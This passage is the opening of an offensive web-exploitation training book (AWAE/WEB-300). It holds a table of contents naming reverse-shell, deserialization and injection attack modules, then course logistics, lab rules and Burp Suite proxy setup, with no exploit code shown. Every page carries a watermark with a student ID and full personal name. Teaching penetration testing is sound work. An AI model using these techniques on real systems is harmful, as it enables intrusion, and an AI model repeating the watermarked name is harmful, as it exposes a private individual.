5.2.6 
Triggering the Vulnerability .............................................................................................. 142 
5.3 
How Houdini Escapes ................................................................................................................ 145 
5.3.2 
Using CHR and String Concatenation ........................................................................... 147 
5.3.3 
It Makes Lexical Sense ..................................................................................................... 148 
5.4 
Blind Bats ..................................................................................................................................... 148 
5.5 
Accessing the File System ........................................................................................................ 149 
5.5.2 
Reverse Shell Via Copy To ............................................................................................... 151 
5.6 
PostgreSQL Extensions ............................................................................................................. 158 
5.6.1 
Build Environment ............................................................................................................. 158 
5.6.2 
Testing the Extension ....................................................................................................... 161 
5.6.3 
Loading the Extension from a Remote Location ......................................................... 162 
5.7 
UDF Reverse Shell ...................................................................................................................... 162 
5.8 
More Shells!!! ............................................................................................................................... 165 
5.8.1 
PostgreSQL Large Objects .............................................................................................. 165 
5.8.2 
Large Object Reverse Shell .............................................................................................. 168 
5.9 
Summary ...................................................................................................................................... 171 
6. 
Bassmaster NodeJS Arbitrary JavaScript Injection Vulnerability ............................................... 172 
6.1 
Getting Started ............................................................................................................................ 172 
6.2 
The Bassmaster Plugin ............................................................................................................. 172 
6.3 
Vulnerability Discovery .............................................................................................................. 173 
6.4 
Triggering the Vulnerability ....................................................................................................... 181 
6.5 
Obtaining a Reverse Shell ......................................................................................................... 183 
6.6 
Wrapping Up ................................................................................................................................ 187 
7. 
DotNetNuke Cookie Deserialization RCE ......................................................................................... 188 
7.1 
Serialization Basics .................................................................................................................... 188 
7.1.1 
XmlSerializer Limitations ................................................................................................. 189 
7.1.2 
Basic XmlSerializer Example ........................................................................................... 189 
7.1.3 
Expanded XmlSerializer Example ................................................................................... 193 
7.1.4 
Watch your Type, Dude .................................................................................................... 197 
7.2 
DotNetNuke Vulnerability Analysis .......................................................................................... 200 
7.2.1 
Vulnerability Overview ...................................................................................................... 200 
7.2.2 
Manipulation of Assembly Attributes for Debugging ................................................. 203 
7.2.3 
Debugging DotNetNuke Using dnSpy ........................................................................... 206 
7.2.4 
How Did We Get Here? ..................................................................................................... 208 
7.3 
Payload Options .......................................................................................................................... 211 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
6 
7.3.1 
FileSystemUtils PullFile Method ..................................................................................... 212 
7.3.2 
ObjectDataProvider Class ................................................................................................ 212 
7.3.3 
Example Use of the ObjectDataProvider Instance ...................................................... 216 
7.3.4 
Serialization of the ObjectDataProvider ........................................................................ 220 
7.3.5 
Enter The Dragon (ExpandedWrapper Class) .............................................................. 223 
7.4 
Putting It All Together ................................................................................................................ 228 
7.5 
Wrapping Up ................................................................................................................................ 233 
8. 
ERPNext Authentication Bypass and Server Side Template Injection ....................................... 234 
8.1 
Getting Started ............................................................................................................................ 234 
8.1.1 
Configuring the SMTP Server .......................................................................................... 234 
8.1.2 
Configuring Remote Debugging ..................................................................................... 235 
8.1.3 
Configuring MariaDB Query Logging ............................................................................. 244 
8.2 
Introduction to MVC, Metadata-Driven Architecture, and HTTP Routing ........................ 245 
8.2.1 
Model-View-Controller Introduction ............................................................................... 245 
8.2.2 
Metadata-driven Design Patterns ................................................................................... 248 
8.2.3 
HTTP Routing in Frappe ................................................................................................... 252 
8.3 
Authentication Bypass Discovery ............................................................................................ 257 
8.3.1 
Discovering the SQL Injection ......................................................................................... 257 
8.4 
Authentication Bypass Exploitation ........................................................................................ 266 
8.4.1 
Obtaining Admin User Information ................................................................................ 267 
8.4.2 
Resetting the Admin Password ...................................................................................... 268 
8.5 
SSTI Vulnerability Discovery ..................................................................................................... 277 
8.5.1 
Introduction to Templating Engines .............................................................................. 277 
8.5.2 
Discovering The Rendering Function ............................................................................ 282 
8.5.3 
SSTI Vulnerability Filter Evasion ..................................................................................... 290 
8.6 
SSTI Vulnerability Exploitation ................................................................................................. 293 
8.6.1 
Finding a Method for Remote Command Execution .................................................. 293 
8.6.2 
Gaining Remote Command Execution .......................................................................... 298 
8.7 
Wrapping Up ................................................................................................................................ 299 
9. 
openCRX Authentication Bypass and Remote Code Execution .................................................. 300 
9.1 
Getting Started ............................................................................................................................ 300 
9.2 
Password Reset Vulnerability Discovery ................................................................................ 300 
9.2.1 
When Random Isn’t ........................................................................................................... 308 
9.2.2 
Account Determination .................................................................................................... 311 
9.2.3 
Timing the Reset Request ............................................................................................... 312 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
7 
9.2.4 
Generate Token List .......................................................................................................... 313 
9.2.5 
Automating Resets ........................................................................................................... 315 
9.3 
XML External Entity Vulnerability Discovery .......................................................................... 319 
9.3.2 
Introduction to XML .......................................................................................................... 320 
9.3.3 
XML Parsing ....................................................................................................................... 320 
9.3.4 
XML Entities ........................................................................................................................ 321 
9.3.5 
Understanding XML External Entity Processing Vulnerabilities ............................... 322 
9.3.6 
Finding the Attack Vector ................................................................................................ 323 
9.3.7 
CDATA ................................................................................................................................. 329 
9.3.8 
Updating the XXE Exploit ................................................................................................. 330 
9.3.9 
Gaining Remote Access to HSQLDB ............................................................................. 331 
9.3.10 
Java Language Routines ................................................................................................. 336 
9.4 
Remote Code Execution ............................................................................................................ 336 
9.4.2 
Finding the Write Location ............................................................................................... 342 
9.4.3 
Writing Web Shells ............................................................................................................ 342 
9.5 
Wrapping Up ................................................................................................................................ 343 
10. 
openITCOCKPIT XSS and OS Command Injection - Blackbox ............................................... 344 
10.1 
Getting Started ............................................................................................................................ 344 
10.2 
Black Box Testing in openITCOCKPIT .................................................................................... 344 
10.3 
Application Discovery ................................................................................................................ 345 
10.3.1 
Building a Sitemap ............................................................................................................ 345 
10.3.2 
Targeted Discovery ........................................................................................................... 350 
10.4 
Intro To DOM-based XSS .......................................................................................................... 355 
10.5 
XSS Hunting ................................................................................................................................. 357 
10.6 
Advanced XSS Exploitation ...................................................................................................... 359 
10.6.1 
What We Can and Can’t Do ............................................................................................. 359 
10.6.2 
Writing to DOM ................................................................................................................... 361 
10.6.3 
Creating the Database ...................................................................................................... 364 
10.6.4 
Creating the API ................................................................................................................. 367 
10.6.5 
Scraping Content ............................................................................................................... 369 
10.6.6 
Dumping the Contents ..................................................................................................... 372 
10.7 
RCE Hunting ................................................................................................................................ 373 
10.7.1 
Discovery ............................................................................................................................. 374 
10.7.2 
Reading and Understanding the JavaScript ................................................................. 376 
10.7.3 
Interacting With the WebSocket Server ........................................................................ 381 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
8 
10.7.4 
Building a Client ................................................................................................................. 381 
10.7.5 
Attempting to Inject Commands .................................................................................... 385 
10.7.6 
Digging Deeper ................................................................................................................... 386 
10.8 
Wrapping Up ................................................................................................................................ 389 
11. 
Concord Authentication Bypass to RCE ..................................................................................... 391 
11.1 
Getting Started ............................................................................................................................ 391 
11.2 
Authentication Bypass: Round One - CSRF and CORS ....................................................... 395 
11.2.1 
Same-Origin Policy (SOP) ................................................................................................ 396 
11.2.2 
Cross-Origin Resource Sharing (CORS) ........................................................................ 401 
11.2.3 
Discovering Unsafe CORS Headers ............................................................................... 409 
11.2.4 
SameSite Attribute ............................................................................................................ 411 
11.2.5 
Exploit Permissive CORS and CSRF .............................................................................. 414 
11.3 
Authentication Bypass: Round Two - Insecure Defaults ..................................................... 428 
11.4 
Wrapping Up ................................................................................................................................ 435 
12. 
Server Side Request Forgery ......................................................................................................... 437 
12.1 
Getting Started ............................................................................................................................ 437 
12.2 
Introduction to Microservices .................................................................................................. 437 
12.2.2 
Web Service URL Formats ............................................................................................... 438 
12.3 
API Discovery via Verb Tampering .......................................................................................... 440 
12.3.1 
Initial Enumeration ............................................................................................................ 440 
12.3.2 
Advanced Enumeration with Verb Tampering ............................................................. 445 
12.4 
Introduction to Server-Side Request Forgery ........................................................................ 448 
12.4.1 
Server-Side Request Forgery Discovery ........................................................................ 448 
12.4.2 
Source Code Analysis ....................................................................................................... 450 
12.4.3 
Exploiting Blind SSRF in Directus ................................................................................... 452 
12.4.4 
Port Scanning via Blind SSRF ......................................................................................... 454 
12.4.5 
Subnet Scanning with SSRF ............................................................................................ 456 
12.4.6 
Host Enumeration ............................................................................................................. 459 
12.5 
Render API Auth Bypass ........................................................................................................... 461 
12.6 
Exploiting Headless Chrome .................................................................................................... 463 
12.6.2 
Using JavaScript to Exfiltrate Data ................................................................................ 465 
12.6.3 
Stealing Credentials from Kong Admin API ................................................................. 467 
12.6.4 
URL to PDF Microservice Source Code Analysis ........................................................ 468 
12.7 
Remote Code Execution ............................................................................................................ 472 
12.7.1 
RCE in Kong Admin API .................................................................................................... 473 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
9 
12.8 
Wrapping Up ................................................................................................................................ 476 
13. 
Guacamole Lite Prototype Pollution ............................................................................................ 477 
13.1 
Getting Started ............................................................................................................................ 477 
13.1.2 
Understanding the Code .................................................................................................. 483 
13.1.3 
Configuring Remote Debugging ..................................................................................... 488 
13.2 
Introduction to JavaScript Prototype ..................................................................................... 492 
13.2.2 
Prototype Pollution ............................................................................................................ 499 
13.2.3 
Blackbox Discovery ........................................................................................................... 504 
13.2.4 
Whitebox Discovery .......................................................................................................... 511 
13.3 
Prototype Pollution Exploitation .............................................................................................. 518 
13.4 
EJS ................................................................................................................................................ 519 
13.4.1 
EJS - Proof of Concept ..................................................................................................... 520 
13.4.2 
EJS - Remote Code Execution ........................................................................................ 527 
13.5 
Handlebars ................................................................................................................................... 532 
13.5.1 
Handlebars - Proof of Concept ....................................................................................... 532 
13.5.2 
Handlebars - Remote Code Execution .......................................................................... 544 
13.6 
Wrapping Up ................................................................................................................................ 562 
14. 
Conclusion ........................................................................................................................................ 563 
14.1 
The Journey So Far .................................................................................................................... 563 
14.2 
Exercises and Extra Miles ......................................................................................................... 563 
14.3 
The Road Goes Ever On ............................................................................................................ 563 
14.4 
Wrapping Up ................................................................................................................................ 564 
 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
10 
0.1.1.1.1 
 
1 Introduction 
Modern web applications present an attack surface that has unquestionably continued to grow in 
importance over the last decade. With the security improvements in network edge devices and 
the reduction of successful attacks against them, web applications, along with social engineering, 
arguably represent the most viable way of breaching the network security perimeter. 
The desire to provide end-users with an ever-increasingly rich web experience has resulted in the 
birth of various technologies and development frameworks that are often layered on top of each 
other. Although these designs achieve their functional goals, they also introduce complexities into 
web applications that can lead to vulnerabilities with high impact. 
In this course, we will focus on the exploitation of chained web application vulnerabilities of 
various classes, which lead to a compromise of the underlying host operating system. As a part 
of the exploit development process, we will also dig deep into the methodologies and techniques 
used to analyze the target web applications. This will give us a complete understanding of the 
underlying flaws that we are going to exploit. 
Ultimately, the goal of this course is to expose you to a general and repeatable approach to web 
application vulnerability discovery and exploitation, while continuing to strengthen the 
foundational knowledge that is necessary when faced with modern-day web applications. 
1.1 About the AWAE Course 
This course is designed to develop, or expand, your exploitation skills in web application 
penetration testing and exploitation research. This is not an entry level course–it is expected that 
you are familiar with basic web technologies and scripting languages. We will dive into, read, 
understand, and write code in several languages, including but not limited to JavaScript, PHP, 
Java, and C#. 
Web services have become more resilient and harder to exploit. In order to penetrate today’s 
modern networks, a new approach is required to gain that initial critical foothold into a network. 
Penetration testers must be fluent in the art of exploitation when using web based attacks. This 
intensive hands-on course will take your skills beyond run-of-the-mill SQL injection and file 
inclusion attacks and introduce you into a world of multi-step, non-trivial web attacks. 
This web application security training will broaden your knowledge of web service architecture in 
order to help you identify and exploit a variety of vulnerability classes that can be found on the 
web today. 
The AWAE course is made up of multiple parts. A brief overview of what you should now have 
access to is below: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
11 
1.1.1.1.1 
 
• 
The AWAE course materials 
• 
Access to the AWAE VPN lab network 
• 
Student forum credentials 
• 
Live support 
• 
OSWE exam attempt/s 
AWAE course materials: comprised of various book modules and the accompanying course 
videos. The information covered in both the book modules and videos overlaps, which allows you 
to watch what is being presented in the videos in a quick and efficient manner, and then reference 
the book modules to fill in the gaps at a later time. 
In some modules, the book modules will go into more depth than the videos but the videos are 
also able to convey some information better than text, so it is important that you pay close 
attention to both. The book modules also contains exercises for each chapter, as well as extra 
miles for those students who would like to go above and beyond what is required in order to get 
the most out of the course. 
Access to the AWAE VPN lab network: Once you have signed up for the course, you will be able to 
download the VPN pack required to access the lab network via the course lab page in the Offsec 
Training Library. This will enable you to access the AWAE VPN lab network, where you will be 
spending a considerable amount of time. Lab time starts when your course begins, and is in the 
form of continuous access. 
If your lab time expires, or is about to expire, you can purchase a lab extension at any time. To 
purchase additional lab time, use the “Extend” link available at top right corner of the Offsec 
Training Library. If you purchase a lab extension while your lab access is still active, you can 
continue to use the same VPN connectivity pack. If you purchase a lab extension after your 
existing lab access has ended, you will need to download a new VPN connectivity pack via the 
course lab page in the Offsec Training Library. 
Students who have purchased a subscription will have access to the lab as long as the 
subscription is active. Your subscription will be automatically renewed, unless cancelled via the 
billing page. 
The Offensive Security Student Forum:1 The student forum is only accessible to Offensive Security 
students. Forum access is permanent and does not expire when your lab time ends. You may 
even continue to interact with your peers long after having passed the OSWE exam. 
By using the forum, you are able to freely communicate with your peers to ask questions, share 
interesting resources, and offer tips and nudges as long as there are no spoilers (due to the fact 
they may ruin the overall course experience for others). Please be very mindful when using the 
forums, otherwise the content you post may be moderated. Once you have successfully passed 
the OSWE exam, you will gain access to the sub-forum for certificate holders. 
Live Support:2 The support system allows you to directly communicate with our student 
administrators, who are members of the Offensive Security staff. Student administrators will 
 
1 (Offensive Security, 2021), https://forums.offensive-security.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
12 
primarily assist with technical issues; however, they may also clear up any doubts you may have 
regarding the course material or the corresponding course exercises. Moreover, they may 
occasionally provide with you a nudge or two if you happen to be truly stuck on a given exercise, 
provided you have already given it your best try. The more detail you provide in terms of things 
you have already tried and the outcome, the better. 
1.1.2 OSWE Exam Attempt 
Included with your initial purchase of the WEB-300 course is an attempt at the Offensive Security 
Web Expert (OSWE) certification. 
To book your OSWE exam, go to your exam scheduling calendar. The calendar can be located in 
the OffSec Training Library under the course exam page. Here you will be able to see your exam 
expiry date, as well as schedule the exam for your preferred date and time. 
Keep in mind that you won’t be able to select a start time if the exam labs are full for that time 
period so we encourage you to schedule your exam as soon as possible. 
For additional information, please visit our support page.3 
1.2 Our Approach 
Students who have taken our introductory PWK course will find this course to be significantly 
different. The AWAE labs are less diverse and contain a few test case scenarios that the course 
focuses on. Moreover, a set of dedicated virtual machines hosting these scenarios will be 
available to each AWAE student to experiment with the course material. In few occasions, 
explanations are intentionally vague in order to challenge you and ensure the concept behind the 
module is clear to you. 
How you approach the AWAE course is up to you. Due to the uniqueness of each student, it is not 
practical for us to tell you how you should approach it, but if you don’t have a preferred learning 
style, we suggest you: 
1. 
Read the emails that were sent to you as part of signup process 
2. 
Start each module by reading the book module and getting a general familiarity with it 
3. 
Once you have finished reading the book module, proceed by watching the accompanying 
video for that module 
4. 
Gain an understanding of what you are required to do and attempt to recreate the exercise in 
the lab 
5. 
Perform the Extra Mile exercises. These are not covered in the labs and are up to you to 
complete on your own 
6. 
Document your findings in your preferred documentation environment 
You may opt to start with the course videos, and then review the information for that given book 
module, or vice versa. As you go through the course material, you may need to re-watch or re-
 
2 (Offensive Security, 2021), https://help.offensive-security.com/ 
3 (Offensive Security, 2021), https://help.offensive-security.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
13 
read modules a number of times prior to fully understanding what is being taught. Remember, it 
is a marathon, not a sprint, so take all the time you need. 
As part of most course modules, there will be course exercises for you to complete. We 
recommend that you fully complete them prior to moving on to the next module. These will test 
your understanding of the material to ensure you are ready to move forward and will help you 
preparing for the OSWE exam. The extra miles exercises are optional but we encourage students 
to “play” with them especially if they have the intention of attempting the certification challenge. 
The time it takes to complete these exercises depends on your background. 
Note that IPs and certain code snippets shown in the book module and videos will not match your 
environment. We strongly recommend you try to recreate all example scenarios from scratch, 
rather than copying code from the book modules or videos. In all modules we will challenge you 
to think in different ways, and rise to the challenges presented. 
In addition to the course modules, the lab also contains three standalone lab machines running 
custom web applications. These applications contain multiple vulnerabilities based on the 
material covered in the course modules. You will need to apply the lessons learned in this course 
to tackle these additional machines on your own. 
A heavy focus of the course is on whitebox application security research, so that you can create 
exploits for vulnerabilities in widely deployed appliances and technologies. Eventually, each 
security professional develops his or her own methodology, usually based on specific technical 
strengths. The methodologies suggested in this course are only suggestions. We encourage you 
to develop your own methodology for approaching web application security testing as you 
progress through the course. 
1.3 Obtaining Support 
AWAE is a self-paced online course. It allows you to go at your own desired speed, perform 
additional research in areas you may be weak at, and so forth. Take advantage of this type of 
setting to get the most out of the course–there is no greater feeling than figuring something out 
on your own. 
Prior to contacting us for support, we expect that you have not only gone over the course material 
but also have taken it upon yourself to dig deeper into the subject area by performing additional 
research. Our Help Centre may help answer some of your questions prior to contacting support 
(the link is accessible without the VPN): 
• 
https://help.offensive-security.com/ 
If your questions have not been covered there, we recommend that you check the student forum, 
which also can be accessed outside of the internal VPN lab network. Ultimately, if you are unable 
to obtain the assistance you need, you can get in touch with our student administrators by visiting 
Live Support or sending an email to help@offensive-security.com. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
14 
1.4 Offensive Security AWAE Labs 
1.4.1 General Information 
As noted above, take note that the IP addresses presented in this guide (and the videos) do not 
necessarily reflect the IP addresses in the Offensive Security lab. Do not try to copy the examples 
in the book modules verbatim; you need to adapt the example to your specific lab configuration. 
You will find the IP addresses of your assigned lab machines in your student control panel within 
the VPN labs. 
1.4.2 Lab Restrictions 
The following restrictions are strictly enforced in the internal VPN lab network. If you violate any 
of the restrictions below, Offensive Security reserves the right to disable your lab access. 
1. 
Do not ARP spoof or conduct any other type of poisoning or man-in-the-middle attacks 
against the network 
2. 
Do not intentionally disrupt other students who are working in the labs. This includes but is 
not limited to: 
– 
Shutting down machines 
– 
Kicking users off machines 
– 
Blocking a specific IP or range 
– 
Hacking into other students’ lab clients or Kali machines 
1.4.3 Forewarning and Lab Behavior 
The internal VPN lab network is a hostile environment and no sensitive information should be 
stored on your Kali Linux virtual machine that you use to connect to the labs. You can help protect 
yourself by stopping services when they are not being used and by making sure any default 
passwords have been changed on your Kali Linux system. 
1.4.4 Control Panel 
Once logged into the AWAE VPN lab network, you can access your AWAE control panel. The 
AWAE control panel enables you to revert lab machines in the event they become unresponsive, 
and so on. 
Each student is provided with 24 reverts every 24 hours, enabling them to return a particular lab 
machine to its pristine state. This counter is reset every day at 00:00 GMT +0. Should you require 
additional reverts, you can contact a student administrator via email (help@offensive-
security.com) or via live support platform4 to have your revert counter reset. 
The minimum amount of time between lab machine reverts is 5 minutes. 
 
4 (Offensive Security, 2021), https://help.offensive-security.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
15 
1.5 Reporting 
Students opting for the OSWE certification must submit an exam report clearly demonstrating 
how they successfully achieved the certification exam objectives. This final report must be sent 
back to our Certification Board in PDF format no more than 24 hours after the completion of the 
certification exam. Please note that reporting of the course exercises is mandatory for those 
students planning to claim CPE credits prior to having successfully passed the OSWE certification 
exam. 
If you were to ask 10 different pentesters how to write a good report, you would likely get 12 
different answers. In other words, everybody has an opinion and they are all correct in their own 
minds. As many people in this industry have demonstrated, there are good ways to write a report 
and there are some really bad ways to do it. 
1.6 Backups 
There are two types of people: those who regularly back up their documentation, and those who 
wish they did. Backups are often thought of as insurance - you never know when you’re going to 
need it until you do. As a general rule, we recommend that you backup your documentation 
regularly as it’s a good practice to do so. Please keep your backups in a safe place, as you 
certainly don’t want them to end up in a public git repo, or the cloud for obvious reasons! 
Documentation should not be the only thing you back up. Make sure you back up important files 
on your Kali VM, take appropriate snapshots if needed, and so on. 
1.7 About the OSWE Exam 
The OSWE certification exam simulates a live network in a private lab, which contains a small 
number of vulnerable systems. The environment is completely dedicated to you for the duration 
of the exam, and you will have 47 hours and 45 minutes to complete it. 
To ensure the integrity of our certifications, the exam will be remotely proctored. You are required 
to be present 15 minutes before your exam start time to perform identity verification and other 
pre-exam tasks. In order to do so, click on the Exam tab in the Offsec Training Library, which is 
situated at the top right of your screen. During these pre-exam verification steps, you will be 
provided with a VPN connectivity pack. 
Once the exam has ended, you will have an additional 24 hours to put together your exam report 
and document your findings. You will be evaluated on quality and accuracy of the exam report, so 
please include as much detail as possible and make sure your findings are all reproducible. 
Once your exam files have been accepted, your exam will be graded and you will receive your 
results in ten business days. If you achieve a passing score, we will ask you to confirm your 
physical address so we can mail your certificate. If you have not achieved a passing score, we will 
notify you, and you may purchase a certification retake using the appropriate links. 
We highly recommend that you carefully schedule your exam for a two day window when you can 
ensure no outside distractions or commitments. Also, please note that exam availability is 
handled on a first come, first served basis, so it is best to schedule your exam as far in advance 
as possible to ensure your preferred date is available. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
16 
For additional information regarding the exam, we encourage you to take some time to go over 
the OSWE exam guide.5 
1.8 Wrapping Up 
In this module, we discussed important information needed to make the most of the AWAE 
course and lab. 
We wish you the best of luck on your AWAE journey and hope you enjoy the new challenges you 
will face. 
 
5 (Offensive Security, 2021), https://help.offensive-security.com/hc/en-us/articles/360046869951-OSWE-Exam-Guide 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
17 
1.8.1.1.1 
 
2 Tools & Methodologies 
When assessing a web application, researchers use a variety of tools and methodologies. 
Nevertheless, certain principles should be followed regardless of the tools used. In this module, 
we will introduce some of the more common tools and demonstrate their use to establish a 
foundation for the remainder of this course. 
Before we get started, it’s important to clarify that web application research and exploitation can 
be conducted from a whitebox,6 blackbox,7 or greybox8 perspective. In a whitebox scenario, the 
researcher either has access to the original source code or is at least able to recover it in a near-
original state. When neither of these scenarios is possible, the researcher must adopt a blackbox 
approach, in which minimal information about the target application is available. In this case, in 
order to find a vulnerability, the researcher needs to observe the behavior of the application by 
inspecting the output and/or the effects generated as result of precisely-crafted input requests. 
We might also take a greybox approach when we have access to credentials or documentation to 
the application, but not full access required for a whitebox approach. 
When adopting a whitebox perspective, web applications are often easier to research and exploit 
than traditional compiled applications since web applications are written in interpreted languages, 
which do not require reverse engineering. In addition, the source code for web applications 
written in bytecode-based languages such as Java, .NET, or similar can also be trivially recovered 
into near-original state with the help of specialized tools. 
It’s worth mentioning that the ability to recover and read the source code of a modern web 
application does not necessarily reduce the complexity of the required research. However, once 
the source code is recovered, the researcher can better inspect the internal structure of the 
application and perform a thorough analysis of the code flow. 
As a penetration tester, we can use chained attack methods to exploit a variety or programming 
oversights. 
2.1 Web Traffic Inspection 
When dealing with an unknown web application, we should always begin with traffic inspection. A 
web application presents various interface elements and conducts various network transactions. 
As researchers, we are always interested in capturing as much information about our targets as 
possible and in this case, a web application proxy is an indispensable tool. We can use a good 
proxy to capture relevant client requests and server responses and easily manipulate a chosen 
request in arbitrary ways. 
In this course, we will primarily use the community edition of the Burp Suite (installed in Kali Linux 
by default), which provides us with everything we need to conduct thorough information 
gathering and HTTP request manipulation. 
 
6 (Wikipedia, 2021), https://en.wikipedia.org/wiki/White-box_testing 
7 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Black-box_testing 
8 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Gray_box_testing 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
18 
2.1.1 Burp Suite Proxy 
We can launch Burp Suite in Kali via the launcher menu. Once we start it, we may receive a 
notification indicating that Burp Suite has not been tested with our current Java version (Figure 
1). 
 
Figure 1: Burp Suite Java version warning 
Since the Kali team always tests Burp Suite on the Java version shipped with the OS, we can 
safely ignore this warning. 
The first time we run Burp Suite, it will prompt us to accept the Terms and Conditions. 
 
Figure 2: Burp Suite Terms and Conditions 
We can accept the Terms and Conditions by clicking I Accept after deciding whether or not to 
submit anonymous feedback. 
The next window offers us the opportunity to start a new project or restore a previously saved 
one. The ability to use project files is a Burp Suite Professional feature. We do not need to use this 
feature for this course, so we’ll leave Temporary project selected and continue. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
19 
 
Figure 3: Burp Suite temporary project 
The final prompt presents the option to load a custom configuration or accept the defaults. Burp 
Suite allows us to customize and streamline our workflow and settings through these custom 
configurations. For now we will stick with the Burp Suite default profile and click Start Burp. 
 
Figure 4: Burp Suite configuration settings 
Once Burp Suite has started, we can validate that our proxy service is running by checking the 
Event log in the lower-lefthand corner of the Dashboard. A message similar to the following will be 
displayed: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
20 
 
Figure 5: Burp Suite proxy running 
Now that the proxy service is running, we need to configure a browser. Burp Suite includes an 
embedded Chromium browser that is preconfigured to proxy traffic through Burp Suite’s proxy. 
We can launch it by clicking on the Proxy tab and then the Intercept tab. 
 
Figure 6: Burp Suite Intercept tab 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
21 
2.1.1.1.1 
 
We can launch the embedded Chromium browser by clicking on either of the Open Browser 
buttons on this tab. 
Now that our proxy is set up, we will briefly test it. In this case we will navigate to the lab VM that 
is hosting a vulnerable version of the Concord9 web application. Please note that for this course, 
we have made hosts entries in our Kali Linux attacking machine that allow us to refer to the lab 
machines by name.  
kali@kali:~$ cat /etc/hosts 
127.0.0.1   localhost 
127.0.1.1   kali 
 
# The following lines are desirable for IPv6 capable hosts 
::1     localhost ip6-localhost ip6-loopback 
ff02::1 ip6-allnodes 
ff02::2 ip6-allrouters 
# AWAE lab machines 
192.168.121.103 atutor 
192.168.121.112 bassmaster 
192.168.121.113 manageengine 
192.168.121.120 dotnetnuke 
192.168.121.123 erpnext 
192.168.121.126 opencrx 
192.168.121.129 openitcockpit 
192.168.121.132 concord 
192.168.121.135 apigateway 
192.168.121.138 chips 
192.168.121.247 photog 
192.168.121.247 sqeakr 
192.168.121.249 docedit 
192.168.121.251 answers 
192.168.121.253 debugger 
Listing 1 - Kali hosts file 
Make sure to edit your /etc/hosts file on your Kali Linux box in order to reflect the 
IP addresses of the vulnerable targets that can be found in your student control 
panel. 
If we now try to browse to the http://concord:8001/ URL, we will notice that the browser is not 
completing the request since Burp Suite turns on the Intercept feature by default. 
 
9 (Walmart, 2021), https://concord.walmartlabs.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
22 
 
Figure 7: Chromium connecting 
As the name suggests, this feature intercepts requests sent to the proxy. It then allows us to 
either inspect and forward a request to the target or drop it by using the appropriate buttons as 
shown in Figure 8. 
 
Figure 8: Burp Suite Intercept On/Off switch 
For the purposes of this module, we can safely turn this feature off by clicking Intercept is on. The 
text on the button will update to “Intercept is off”. 
The HTTP history tab is fairly self-explanatory–this is where Burp Suite lists the entire session 
history, which includes all requests and responses proxied through it. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
23 
 
Figure 9: Burp Suite history tab 
Excellent. We have verified that Burp Suite is capturing our browser traffic. 
2.1.2 Using Burp Suite with Other Browsers 
Before we move on to some of the other tools in Burp Suite, let’s demonstrate how to configure 
another browser to use Burp Suite as a proxy. In Firefox, we can do this by navigating to 
about:preferences#advanced, scrolling down to Network Settings, and then clicking Settings. 
Here we’ll choose the Manual option, setting the appropriate IP address and listening port. In our 
case, the proxy and the browser reside on the same host, so we’ll use the loopback interface and 
specify port 8080. However, if we planned on using the proxy to intercept traffic from multiple 
machines, we would use the public IP address of the machine running the proxy for this setting. 
Finally, we also want to check the Use this proxy server for all protocols option in order to make 
sure that we can intercept every request while testing the target application. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
24 
 
Figure 10: Firefox network settings 
Note that once we configure Firefox in this way, we will need Burp Suite running in order to 
access any website. To stop using Burp Suite as a proxy we must return to connection settings 
and select Use system proxy settings. Alternatively we could use any of a number of browser add-
ons (such as FoxyProxy) to switch between proxy server settings. 
2.1.3 Burp Suite Scope 
Modern web applications generally contain many requests and responses to sites that may not 
be of any interest to us, such as third party statistics collectors, ad networks, etc. In order to filter 
this traffic and streamline our workflow, Burp Suite allows us to set a collection scope. We can do 
this now by right-clicking any Concord request (with a URL ending with a forward slash) and 
selecting Add to scope. 
